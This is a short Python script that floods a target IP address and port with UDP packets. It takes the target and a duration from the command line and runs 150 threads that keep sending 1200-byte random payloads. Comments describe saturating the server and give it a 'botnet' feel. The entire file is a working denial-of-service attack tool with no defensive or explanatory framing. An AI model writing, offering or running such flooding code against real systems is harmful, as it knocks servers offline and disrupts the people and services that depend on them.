import socket, random, sys, time
from threading import Thread

if len(sys.argv) < 4: sys.exit()

ip, port, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
# Large payload to saturate the server
payload = random._urandom(1200)

def flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + duration
    while time.time() < end:
        try:
            # Blast the packets
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
        except: pass

# Spin up 150 threads for a massive "botnet" feel
for _ in range(150):
    Thread(target=flood, daemon=True).start()

time.sleep(duration)
